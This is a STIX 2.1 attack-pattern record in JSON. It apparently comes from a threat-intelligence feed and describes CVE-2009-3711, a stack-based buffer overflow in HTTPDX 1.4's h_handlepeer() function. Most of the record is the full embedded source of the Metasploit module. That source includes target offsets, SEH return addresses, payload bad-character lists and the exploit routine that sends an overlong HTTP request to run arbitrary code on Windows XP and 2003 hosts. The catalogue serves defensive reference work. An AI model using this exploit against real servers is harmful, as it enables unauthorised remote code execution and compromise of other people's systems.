{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--781cd9c8-5d24-4174-b66f-ee0e74611d4d",
    "created": "2024-08-14T16:55:05.137623Z",
    "modified": "2024-08-14T16:55:05.137626Z",
    "name": "HTTPDX h_handlepeer() Function Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow vulnerability in HTTPDX HTTP server 1.4. The vulnerability is caused due to a boundary error within the \"h_handlepeer()\" function in http.cpp. By sending an overly long HTTP request, an attacker can overrun a buffer and execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/httpdx_handlepeer.rb",
            "external_id": "httpdx_handlepeer.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-3711"
        },
        {
            "source_name": "reference",
            "url": "http://www.pank4j.com/exploits/httpdxb0f.php"
        },
        {
            "source_name": "reference",
            "url": "http://www.rec-sec.com/2009/10/16/httpdx-buffer-overflow-exploit/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# httpdx_handlepeer.rb\n#\n# HTTPDX 'h_handlepeer()' Function Buffer Overflow exploit for the Metasploit Framework\n#\n# Tested successfully on the following platforms\n#  - HTTPDX 1.4 on Microsoft Windows XP SP3\n#\n# This vulnerability was found by Pankaj Kohli, see references.\n#\n# Trancer\n# http://www.rec-sec.com\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  HttpFingerprint = { :pattern => [ /httpdx\\/.* \\(Win32\\)/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HTTPDX h_handlepeer() Function Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow vulnerability in HTTPDX HTTP server 1.4. The\n        vulnerability is caused due to a boundary error within the \"h_handlepeer()\" function in http.cpp.\n        By sending an overly long HTTP request, an attacker can overrun a buffer and execute arbitrary code.\n      },\n      'Author'         =>\n        [\n          'Pankaj Kohli <pankaj208[at]gmail.com>',\t# Original exploit [see References]\n          'Trancer <mtrancer[at]gmail.com>',\t\t\t# Metasploit implementation\n          'jduck'\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '58714' ],\n          [ 'CVE', '2009-3711' ],\n          [ 'URL', 'http://www.pank4j.com/exploits/httpdxb0f.php' ],\n          [ 'URL', 'http://www.rec-sec.com/2009/10/16/httpdx-buffer-overflow-exploit/' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process'\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 472,\n          # other characters get mangled, but only in a temporary buffer\n          'BadChars' => \"\\x00\\x0a\\x0d\\x20\\x25\\x2e\\x2f\\x3f\\x5c\",\n          'StackAdjustment' => -3500,\n          # 'DisableNops'\t=>  'True'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\t'httpdx 1.4 - Windows XP SP3 English',\n            {\n              'Offset' \t=> 476,\n              'Ret' \t\t=> 0x63b81a07,  # seh handler (pop/pop/ret in n.dll)\n              'Readable' \t=> 0x63b80131 \t # early in n.dll\n            }\n          ],\n          [\t'httpdx 1.4 - Windows 2003 SP2 English',\n            {\n              'Offset' \t=> 472,\n              'Ret' \t\t=> 0x63b81a07,  # seh handler (pop/pop/ret in n.dll)\n              'Readable' \t=> 0x63b80131 \t # early in n.dll\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-10-08'\n    ))\n  end\n\n  def check\n    info = http_fingerprint  # check method\n    if info and (info =~ /httpdx\\/(.*) \\(Win32\\)/)\n      return Exploit::CheckCode::Detected\n    end\n    Exploit::CheckCode::Safe\n  end\n\n\n  def exploit\n    uri = payload.encoded\n    if target['Offset'] > payload_space\n      pad = target['Offset'] - payload_space\n      uri << rand_text(pad)\n    end\n    uri << generate_seh_record(target.ret)\n    # jmp back to shellcode\n    uri << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + (target['Offset'] + 5).to_s).encode_string\n    # extra causing hitting end of the stack\n    uri << rand_text_alphanumeric(1024)\n\n    uri[620,4] = [target['Readable']].pack('V') # arg (must be readable)\n\n    sploit = '/' + rand_text(3) + '=' + uri\n\n    # an empty host header gives us 512 bytes in the client structure\n    # (the client->filereq and client->host buffers are adjacement in memory)\n    datastore['VHOST'] = ''\n\n    print_status(\"Trying target #{target.name}...\")\n    res = send_request_raw(\n      {\n        'uri'      => sploit\n      }, 5)\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-10-08",
    "x_mitre_platforms": [
        "win'"
    ]
}